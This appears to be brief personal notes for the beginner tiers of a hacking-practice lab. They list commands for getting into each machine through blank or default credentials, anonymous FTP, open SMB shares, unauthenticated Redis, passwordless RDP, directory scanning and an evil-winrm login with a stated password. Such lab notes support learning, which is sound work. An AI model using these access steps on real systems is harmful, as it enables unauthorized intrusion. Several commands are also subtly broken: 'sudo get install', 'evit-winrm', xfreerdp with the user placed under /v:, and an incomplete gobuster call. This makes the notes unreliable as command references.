# TIER 0

### Meow  
telnet as "root", blank password

### Fawn
ftp as anonymous, get flag.txt  

### Dancing  
smbclient -L {IP-address}  
smbclient \\\\{IP-address}\\WorkShares  
ls; cd ..; cd James.P; get flag.txt  

### Redeemer  
redis-cli -h {IP-address}
info  
keys *  
get Flag  

### Explosion
RDP as Administrator, no password  
xfreerdp /v:Administrator /cert:ignore /v:{IP-addess}  

### Preignition
gobuster -x php {IP-address}
http://{IP-address}/admini.php

# TIER 1

###  
sudo get install evil-winrm  
evit-winrm -u Administrator -p badminton -i {IP-address}  

